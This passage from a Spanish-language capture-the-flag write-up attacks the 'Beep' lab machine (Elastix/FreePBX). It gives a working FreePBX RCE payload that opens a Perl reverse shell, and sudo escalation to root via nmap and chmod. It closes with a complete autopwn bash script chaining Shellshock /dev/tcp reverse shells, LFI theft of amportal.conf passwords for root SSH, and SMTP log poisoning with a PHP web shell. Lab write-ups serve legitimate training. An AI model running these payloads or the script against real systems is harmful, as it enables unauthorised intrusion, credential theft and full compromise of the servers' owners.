![webmin](/images/posts/webmin-admin-page.png)
 
 Esta interfaz está diseñada para administrar el sistema y tenemos acceso de root debido a las credenciales que encontramos antes, así que podemos crear una tarea como root:
 
![schedule command](/images/posts/schedule-command.png)

![schedule command created](/images/posts/schedule-command-created.png)
 
En un minuto (dependiendo del tiempo que les hayas dado), el script se ejecutará y obtendremos una shell inversa:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.7] 43947
bash: no job control in this shell
[root@beep /]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep /]# whoami
root
```

# FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution [Path #5]

Como sabemos que FreePBX está funcionando en este servidor, podemos probar este POC:

```shell
❯ searchsploit elastix freepbx
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                   | php/webapps/18650.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Mirando el exploit podemos ver un payload:

```python
import urllib
import ssl
rhost="10.10.10.7" # add the target IP
lhost="10.10.16.3" # add your IP
lport=443 # change the port
extension="1000" # change the extension number with a valid number

ssl._create_default_https_context = ssl._create_unverified_context

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url)
```

Tenemos que modificar lo siguiente:
- Cambiar la IP del Host Remoto por la IP de destino
- Cambiar la IP del Host Local por la nuestra.
- Cambiar el puerto de escucha (¡si quieres!)
- Cambiar el número de extensión por un número válido


Podemos utilizar el script python de sipvicious svwar para encontrar números de extensiones válidos:
[sipvicious github](https://github.com/EnableSecurity/sipvicious/)

Podemos instalar sipvicious leyendo su página de documentación: 
[sipvicious installation doc](https://github.com/EnableSecurity/sipvicious/wiki/Basics#installation)

```shell
git clone https://github.com/enablesecurity/sipvicious.git
cd sipvicious
sudo python3 setup.py install
pip3 install .
sipvicious_svcrack --help
```

Ahora necesitamos una invitación y una serie de extensiones para encontrar una autenticación:

```shell
❯ sipvicious_svwar -m INVITE -e 100-999 10.10.10.7 2>/dev/null
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
| 407       | weird          |
+-----------+----------------+
| 409       | weird          |
+-----------+----------------+
| 525       | weird          |
+-----------+----------------+
| 534       | weird          |
+-----------+----------------+
| 504       | weird          |
+-----------+----------------+
| 519       | weird          |
+-----------+----------------+
| 791       | weird          |
+-----------+----------------+
| 759       | weird          |
+-----------+----------------+
| 825       | weird          |
+-----------+----------------+
| 884       | weird          |
+-----------+----------------+
```

La extensión 233 parece ser válida.

Podemos conseguir una cáscara inversa haciéndolo manualmente:

```shell
curl -sk "https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.3%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"
```

Entonces coge una shell invertida con nc:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 33688
id
uid=100(asterisk) gid=101(asterisk)
```

# Privilege Escalation

Lista la configuración de sudo:

```
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

GTFOBins tiene una cheatsheet para abusar el binario de nmap:
[GTFOBins nmpa sudo](https://gtfobins.github.io/gtfobins/nmap/#sudo)

Puedes escalar a root:

```shell
bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
whoami
root
```

Alternativamente, también puedes utilizar chmod:

```
bash-3.2$ LFILE=/bin/bash
bash-3.2$ sudo chmod 4755 $LFILE
bash-3.2$ /bin/bash -p
id
uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
whoami
root
```

# AutoPWN

Crea el archivo autopwn:

```
vim autopwn-beep.sh
```

Añade el siguiente código:

```shell
#!/bin/bash

ctrl_c(){
	echo "[!] Exiting..."
	exit 1
}

trap ctrl_c INT

shellshock(){
	echo "[+] Shellshock."
	set -m &>/dev/null
    read -p "[+] LHOST: " lhost
	read -p "[+] LPORT: " lport
	nc -lvnp $lport &
    payload=$(timeout 4 curl -sk "https://10.10.10.7:10000/session_login.cgi" -A "() { :; };/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1")
    fg %1
}

lfi(){
	echo "[+] File disclosure via LFI"
	pass=$(curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -oP "AMPMGRPASS=(.*)" | cut -d'=' -f 2 | tail -n 1)
	echo "[!] Wait..."
	which sshpass &>/dev/null
	if [ $? -eq 0 ]; then
		sshpass -p "$pass" ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.10.10.7
	else
		read -p "[+] The package 'sshpass' is not installed, do you want to install it? (yes/no) " answer
		if [ $answer == "yes" ];then
			sudo apt-get update &>/dev/null && sudo apt-get install sshpass -y &>/dev/null
			sshpass -p "$pass" ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.10.10.7
		else
			echo "[!] If you don't want to install the package you can just login with credentials user=root pass=$pass"
			exit 0
		fi
	fi
}


rce_vuln(){
    echo "[+] RCE via FreePBX"
    set -m &>/dev/null
    read -p "[+] LHOST: " lhost
	read -p "[+] LPORT: " lport
    nc -lvnp $lport &
    rce=$(curl -sk "https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22$lhost%3a$lport%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A")
    fg %1
}

smtp_log_poisoning(){
    echo "[+] SMTP Log Poisoning and Execute via LFI to RCE"
    which swaks &>/dev/null
    if [ $? -eq 0 ]; then
        swaks --to asterisk@localhost --from wixnic@helo.htb --header "Subject: Shell" --body 'PHP code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
    else
        read -p "[+] The package 'swaks' is not installed, do you want to install it? (yes/no) " answer
        if [ $answer = "yes" ]; then
            sudo apt update &>/dev/null && sudo apt install swaks -y &>/dev/null
            swaks --to asterisk@localhost --from wixnic@helo.htb --header "Subject: Shell" --body 'PHP code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
        else
            echo "[+] You can just use another attack vector or use telnet and send this payload in a email: <?php system($_REQUEST["cmd"]); ?>' "
            exit 0
        fi
    fi 
    set -m &>/dev/null
    read -p "[+] LHOST: " lhost
	read -p "[+] LPORT: " lport
    nc -lvnp $lport &
    rce=$(timeout 4 curl -sk "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action" --data-urlencode "cmd=bash -i >& /dev/tcp/$lhost/$lport 0>&1")
    fg %1
}

help(){
	echo "[!] Usage: $0 -p [1-4]"
    echo "[!] Example: $0 -p 1"
    echo -e "\n1 = Shellshock\n2 = LFI File Disclosure SSH Login\n3 = RCE Vulnerability\n4 = SMTP Log Poisoning"
}

[ $# -eq 0 ] && help

while getopts 'p:' arg; do
  case "${arg}" in
    p) parameter=${OPTARG}
    if [ "$parameter" == "1" ]; then
        shellshock
	elif [ "$parameter" == "2" ]; then
		lfi
    elif [ "$parameter" == "3" ]; then
        rce_vuln
    elif [ "$parameter" == "4" ]; then
        smtp_log_poisoning
	else
		help
	fi
	;;
    *) help
	;;
  esac
done
```

Añadir permisos de ejecución:

```shell
chmod +x autopwn-beep.sh
```

Elije el payload:

```shell
❯ bash autopwn-beep.sh
[!] Usage: autopwn-beep.sh -p [1-4]
[!] Example: autopwn-beep.sh -p 1

1 = Shellshock
2 = LFI File Disclosure SSH Login
3 = RCE Vulnerability
4 = SMTP Log Poisoning
```
